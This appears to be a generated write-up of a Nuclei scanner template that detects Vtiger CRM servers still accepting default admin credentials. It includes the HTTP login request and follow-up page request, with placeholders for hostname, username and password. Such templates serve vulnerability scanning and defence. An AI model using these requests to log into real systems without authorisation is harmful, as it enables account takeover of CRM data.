# Nuclei Template: Vtiger CRM - Default Login
**Template ID:** vtigercrm-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`vtigercrm-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected a Vtiger CRM instance that enabled default admin credentials.

## Steps to reproduce / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name={{username}}&user_password={{password}}

GET /index.php?action=index&module=Home HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/vtiger-crm/vtigercrm
- https://code.vtiger.com/vtiger/vtigercrm
